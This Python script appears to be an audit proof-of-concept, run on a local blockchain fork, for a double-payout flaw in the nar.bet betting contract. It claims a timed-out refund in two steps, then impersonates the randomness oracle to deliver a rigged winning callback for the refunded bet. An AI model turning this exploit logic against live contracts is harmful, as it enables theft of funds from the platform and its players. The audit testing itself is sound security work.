#!/usr/bin/env python3
"""nar.bet — FORK ATTACK v4: the refund is TWO-STEP. Claim it, then fire a winning callback.

v3 result (fork): at bet+2100 `Refund()` succeeded, emitted ONE log, left `GetState` at
[1e18, seq, 0, betBlk, 1, 0] (still awaiting) and moved no money. So:
  - REFUND_TIMEOUT_BLOCKS (2000) gates the *commitment*  -> RefundTooEarly(have, bet+2001)
  - REFUND_COMMIT_WAIT_BLOCKS (20) gates the *claim*      -> a second Refund() 20 blocks later
That also explains v2's flat timeline: before any commitment exists, the timeout gate reverts first.

This script walks the real two-step path and then tests the invariant that matters:
after the wager has been refunded, can the late callback still settle the request and pay out?

Output: fork/refund-twostep.json
"""
import json, os, time, urllib.request
from eth_abi import encode, decode as abi_decode
from eth_utils import keccak

RPC = "http://127.0.0.1:8555"
BASE = os.path.expanduser("~/.hermes/workspace/SAVAGEAUD/TARGETS/narbet")
OUT = os.path.join(BASE, "fork")
RPS = "0x843d62ad75f5d0b383f8520e23d19174b7961b8e"
ENTROPY = "0xd458261e832415cfd3bae5e416fdf3230ce6f134"
PROVIDER = "0x52deaa1c84233f7bb8c8a45baede41091c616506"
NATIVE = "0x0000000000000000000000000000000000000000"
ACCT0 = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
SEL_PLAY, SEL_REFUND, SEL_STATE, SEL_CB, SEL_FEE = \
    "0x493e7930", "0x0f0aa179", "0xcfea2f6f", "0x52a5f1f8", "0x5768c29a"
WIN_RND = "0x" + "01" * 32
WAGER = 10 ** 18   # module-level default; main() overrides it from argv

ABI = json.load(open(os.path.join(BASE, "recon", "abi-real.json")))
ERRORS = {}
for n, s in ABI["errors"].items():
    ins = (s.get("inputs") or "")
    parts, depth, cur = [], 0, ""
    for ch in ins:
        if ch in "([":
            depth += 1
        elif ch in ")]":
            depth -= 1
        if ch == "," and depth == 0:
            parts.append(cur.strip()); cur = ""
        else:
            cur += ch
    if cur.strip():
        parts.append(cur.strip())
    tt, ok = [], True
    for p in parts:
        t = p.split()[0] if p.split() else p
        if t.startswith("tuple"):
            ok = False
            break
        tt.append(t)
    if ok:
        ERRORS["0x" + keccak(text=f"{n}({','.join(tt)})")[:4].hex()] = (n, tt)

# label every recovered event so a logged topic can be named, never guessed
EVENTS = {}
for n, s in ABI["events"].items():
    ins = (s.get("inputs") or "")
    parts, depth, cur = [], 0, ""
    for ch in ins:
        if ch in "([":
            depth += 1
        elif ch in ")]":
            depth -= 1
        if ch == "," and depth == 0:
            parts.append(cur.strip()); cur = ""
        else:
            cur += ch
    if cur.strip():
        parts.append(cur.strip())
    tt, ok = [], True
    for p in parts:
        t = p.split()[0] if p.split() else p
        if t.startswith("tuple"):
            ok = False
            break
        tt.append(t)
    if ok:
        EVENTS["0x" + keccak(text=f"{n}({','.join(tt)})").hex()] = n

_id = [0]
def rpc(method, params, timeout=90):
    _id[0] += 1
    try:
        d = json.loads(urllib.request.urlopen(urllib.request.Request(
            RPC, data=json.dumps({"jsonrpc": "2.0", "id": _id[0], "method": method,
                                  "params": params}).encode(),
            headers={"Content-Type": "application/json"}), timeout=timeout).read())
    except Exception as e:
        return {"code": -1, "message": str(e)[:150]}
    return d["error"] if "error" in d else d.get("result")


def call(to, data, frm=ACCT0, value=0):
    return rpc("eth_call", [{"from": frm, "to": to, "data": data, "value": hex(value)}, "latest"])


def send(to, data, frm, value=0):
    h = rpc("eth_sendTransaction", [{"from": frm, "to": to, "data": data, "value": hex(value)}])
    return (None, h) if isinstance(h, dict) and h.get("code") else (h, None)


def receipt(h):
    for _ in range(40):
        r = rpc("eth_getTransactionReceipt", [h])
        if r:
            return r
        time.sleep(0.25)
    return None


def bal(a):
    return int(rpc("eth_getBalance", [a, "latest"]), 16)


def blk():
    for _ in range(5):
        r = rpc("eth_blockNumber", [])
        if isinstance(r, str):
            return int(r, 16)
        time.sleep(0.5)
    raise RuntimeError("no block number")


def mine(n=1):
    done = 0
    while done < n:
        step = min(100, n - done)
        r = rpc("anvil_mine", [hex(step), "0x0"])
        if isinstance(r, dict):
            print("   mine error:", r); return done
        done += step
    return done


def mine_to(target):
    g = 0
    while blk() < target and g < 300:
        mine(100); g += 1
    return blk()


def decode_err(res):
    if isinstance(res, dict) and ("code" in res or "message" in res):
        e = res
    elif isinstance(res, dict) and res.get("error"):
        e = res["error"]
    else:
        return ("OK", [])
    data = e.get("data") if isinstance(e, dict) else ""
    if isinstance(data, dict):
        data = data.get("data", "")
    if not data or data == "0x" or len(data) < 10:
        return ("EMPTY_REVERT", [])
    n, tt = ERRORS.get(data[:10], (f"unknown{data[:10]}", []))
    args = []
    if tt:
        try:
            args = list(abi_decode(tt, bytes.fromhex(data[10:])))
        except Exception:
            args = []
    return (n, args)


def state(p=ACCT0):
    r = call(RPS, SEL_STATE + "0" * 24 + p[2:].lower())
    if isinstance(r, dict):
        return r
    w = r[2:]
    return [int(w[i:i + 64], 16) for i in range(0, len(w), 64)]


def play(p=ACCT0, wager=None):
    wager = WAGER if wager is None else wager
    fee = int(rpc("eth_call", [{"to": RPS, "data": SEL_FEE}, "latest"]), 16)
    d = SEL_PLAY + encode(["uint256", "address", "uint8", "uint32"], [wager, NATIVE, 0, 1]).hex()
    h, e = send(RPS, d, p, value=wager + fee)
    return h, e, (receipt(h) if h else None), fee


def deliver(seq, rnd):
    rpc("anvil_impersonateAccount", [ENTROPY])
    rpc("anvil_setBalance", [ENTROPY, hex(10 ** 19)])
    d = SEL_CB + encode(["uint64", "address", "bytes32"],
                        [seq, PROVIDER, bytes.fromhex(rnd[2:])]).hex()
    h, e = send(RPS, d, ENTROPY)
    return h, e, (receipt(h) if h else None)


def logs_named(rc):
    out = []
    for l in (rc or {}).get("logs", []):
        out.append({"topic": l["topics"][0], "event": EVENTS.get(l["topics"][0], "UNMATCHED"),
                    "address": l["address"]})
    return out


def main():
    import sys as _s
    global WAGER
    WAGER = int(_s.argv[1]) if len(_s.argv) > 1 else 10 ** 18
    W = WAGER
    out = {"fork_block": blk(), "wager": W}
    print("fork block", blk())
    b0 = bal(ACCT0)
    h, e, rc, fee = play()
    bet_blk = int(rc["blockNumber"], 16)
    seq = state()[1]
    print(f"bet: tx={h} status={rc['status']} blk={bet_blk} seq={seq} cost={W+fee}")

    # step 1: the commitment (timeout gate)
    want = bet_blk + 2001
    mine_to(want + 1)
    print(f"\n[refund #1 : commitment] block={blk()} (bet+{blk()-bet_blk})")
    h1, e1 = send(RPS, SEL_REFUND, ACCT0)
    rc1 = receipt(h1) if h1 else None
    b1 = bal(ACCT0)
    print(f"  tx={h1} status={rc1 and rc1['status']}  balance delta={ (b1-b0)/1e18:+.4f}")
    print(f"  logs: {logs_named(rc1)}")
    print(f"  GetState: {state()}")
    commit_blk = int(rc1["blockNumber"], 16) if rc1 else None

    # step 2: the claim (commit-wait gate)
    name, args = decode_err(call(RPS, SEL_REFUND, frm=ACCT0))
    print(f"\n[refund #2 : claim] probe at +{blk()-commit_blk} -> {name} {args}")
    if name == "RefundTooEarly" and len(args) == 2:
        mine_to(args[1] + 1)
    else:
        mine_to(commit_blk + 21)
    print(f"  block={blk()} (+{blk()-commit_blk} after the commitment)")
    name, args = decode_err(call(RPS, SEL_REFUND, frm=ACCT0))
    print(f"  probe -> {name} {args}")
    h2, e2 = send(RPS, SEL_REFUND, ACCT0)
    rc2 = receipt(h2) if h2 else None
    b2 = bal(ACCT0)
    print(f"  tx={h2} status={rc2 and rc2['status']}  balance delta={ (b2-b1)/1e18:+.4f}")
    print(f"  logs: {logs_named(rc2)}")
    st2 = state()
    print(f"  GetState: {st2}   awaiting_word={st2[4] if isinstance(st2,list) else '?'}")

    # step 3: the late winning callback on a refunded request
    print(f"\n[late callback] delivering WINNING random {WIN_RND[:10]} for seq {seq}")
    h3, e3, rc3 = deliver(seq, WIN_RND)
    b3 = bal(ACCT0)
    print(f"  tx={h3} status={rc3 and rc3['status']} err={e3}")
    print(f"  balance delta after callback: {(b3-b2)/1e18:+.4f}")
    print(f"  logs: {logs_named(rc3)}")
    print(f"  GetState: {state()}")
    print(f"\n  NET over the whole path: {(b3-b0)/1e18:+.4f} MON "
          f"(bet+refund of 1 MON and a 1.876 MON win would be "
          f"{(1 + 1.876 - 2.4):+.4f} if BOTH landed)")

    out.update({"bet_block": bet_blk, "seq": seq,
                "refund1": {"tx": h1, "status": rc1 and rc1["status"], "logs": logs_named(rc1),
                            "balance_after": (b1 - b0) / 1e18},
                "refund2": {"tx": h2, "status": rc2 and rc2["status"], "logs": logs_named(rc2),
                            "balance_after": (b2 - b1) / 1e18},
                "callback_after_refund": {"tx": h3, "status": rc3 and rc3["status"],
                                          "balance_delta": (b3 - b2) / 1e18,
                                          "logs": logs_named(rc3)},
                "net": (b3 - b0) / 1e18})
    json.dump(out, open(os.path.join(OUT, "refund-twostep.json"), "w"), indent=1)
    print("\nsaved fork/refund-twostep.json")


if __name__ == "__main__":
    main()
